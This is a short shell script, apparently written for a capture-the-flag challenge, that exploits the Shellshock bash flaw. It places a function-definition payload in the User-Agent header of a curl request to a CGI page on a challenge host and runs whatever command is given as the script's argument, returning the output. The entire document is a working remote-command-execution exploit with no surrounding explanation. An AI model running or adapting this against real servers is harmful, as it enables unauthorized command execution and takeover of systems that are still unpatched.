#!/bin/sh

echo "$1"
curl -H "User-Agent: () { :; }; echo Content_type: text/plain; echo; echo; /bin/sh -c '$1' 2>&1"  http://geocities.vuln.icec.tf/index.cgi

